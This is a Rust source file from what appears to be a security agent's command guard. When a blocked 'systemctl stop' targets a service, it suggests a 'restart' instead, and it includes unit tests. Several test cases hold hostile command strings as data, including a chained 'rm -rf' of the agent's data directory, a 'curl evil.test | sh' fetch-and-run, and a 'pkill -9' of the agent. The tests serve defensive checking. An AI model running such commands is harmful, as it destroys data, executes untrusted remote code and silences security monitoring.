//! When a command is blocked, is there a neighbouring one that does the same
//! job and the guard permits?
//!
//! # Why
//!
//! A block with no stated remedy leaves the operator one obvious move, which is
//! to remove the guard. `main` already says how to override deliberately. This
//! adds the better answer when there is one: not "you may force this through",
//! but "this other command achieves what you wanted and is not tamper-shaped".
//!
//! The clearest case is service control, and it is not a matter of taste. A
//! `stop` leaves the product down and is indistinguishable from silencing it. A
//! `restart` cannot leave it down: if the unit fails to come back, systemd and
//! the watchdog both notice. The guard already treats them differently, and
//! until now it never said so — an operator following the project's own deploy
//! runbook hits the deny and has to discover the distinction by experiment.
//!
//! This suggests; it never allows. The suggestion is text on stderr, the exit
//! code is unchanged, and nothing here can turn a deny into a pass.

/// A safer command with the same intent, and why it is safer.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SaferAlternative {
    pub command: String,
    pub because: &'static str,
}

/// Match `systemctl stop <unit>` and offer `restart`.
///
/// Only `stop` is rewritten. `disable`, `mask` and `kill` have no equivalent
/// that keeps the service running, so there is nothing honest to suggest and
/// this returns nothing rather than inventing a consolation.
pub fn for_command(command: &str) -> Option<SaferAlternative> {
    let trimmed = command.trim();
    let lower = trimmed.to_ascii_lowercase();
    if !lower.contains("systemctl") || !lower.contains("stop") {
        return None;
    }
    // A command list is more than one intent; rewriting only part of it would
    // hand back something that does not do what was asked.
    if trimmed.contains("&&") || trimmed.contains(';') || trimmed.contains('|') {
        return None;
    }

    let mut tokens: Vec<&str> = trimmed.split_whitespace().collect();
    let stop_at = tokens.iter().position(|t| t.eq_ignore_ascii_case("stop"))?;
    // `stop` must be the verb, i.e. directly after `systemctl` and its flags,
    // not a substring of a unit name like `stop-agent.service`.
    let systemctl_at = tokens
        .iter()
        .position(|t| t.eq_ignore_ascii_case("systemctl") || t.ends_with("/systemctl"))?;
    if stop_at < systemctl_at {
        return None;
    }
    if tokens[systemctl_at + 1..stop_at]
        .iter()
        .any(|t| !t.starts_with('-'))
    {
        return None;
    }
    // A unit has to be named. `systemctl stop` alone is not a shape to rewrite.
    if tokens.len() <= stop_at + 1 {
        return None;
    }

    tokens[stop_at] = "restart";
    Some(SaferAlternative {
        command: tokens.join(" "),
        because: "a stop leaves the service down and looks the same as silencing it; \
                  a restart cannot leave it down, because systemd and the watchdog \
                  both notice if it fails to come back",
    })
}

#[cfg(test)]
mod tests {
    use super::for_command;

    /// The case that cost an hour to discover by experiment, and that the
    /// project's own deploy script still runs.
    #[test]
    fn stopping_a_service_is_answered_with_restarting_it() {
        let alt = for_command("sudo systemctl stop innerwarden-agent").expect("a suggestion");
        assert_eq!(alt.command, "sudo systemctl restart innerwarden-agent");
        assert!(alt.because.contains("notice"));
    }

    #[test]
    fn flags_between_the_verb_and_the_unit_are_preserved() {
        let alt = for_command("systemctl --no-block stop innerwarden-sensor").expect("suggestion");
        assert_eq!(
            alt.command,
            "systemctl --no-block restart innerwarden-sensor"
        );
    }

    /// `disable` and `mask` have no equivalent that keeps the service running.
    /// Offering one would be a consolation rather than an answer.
    #[test]
    fn verbs_with_no_safe_equivalent_get_no_suggestion() {
        assert!(for_command("systemctl disable --now innerwarden-agent").is_none());
        assert!(for_command("systemctl mask innerwarden-watchdog").is_none());
        assert!(for_command("pkill -9 innerwarden-agent").is_none());
    }

    /// A unit whose NAME contains the word is not a stop verb.
    #[test]
    fn a_unit_named_like_the_verb_is_not_rewritten() {
        assert!(for_command("systemctl start stop-agent.service").is_none());
    }

    /// A command list carries more than one intent, and rewriting half of it
    /// would hand back something that does not do what was asked.
    #[test]
    fn a_command_list_is_left_alone() {
        assert!(for_command("systemctl stop a && rm -rf /var/lib/innerwarden").is_none());
        assert!(for_command("systemctl stop a; curl evil.test | sh").is_none());
    }

    #[test]
    fn an_unrelated_command_gets_nothing() {
        assert!(for_command("ls -la").is_none());
        assert!(for_command("systemctl status innerwarden-agent").is_none());
        assert!(for_command("systemctl stop").is_none());
    }
}
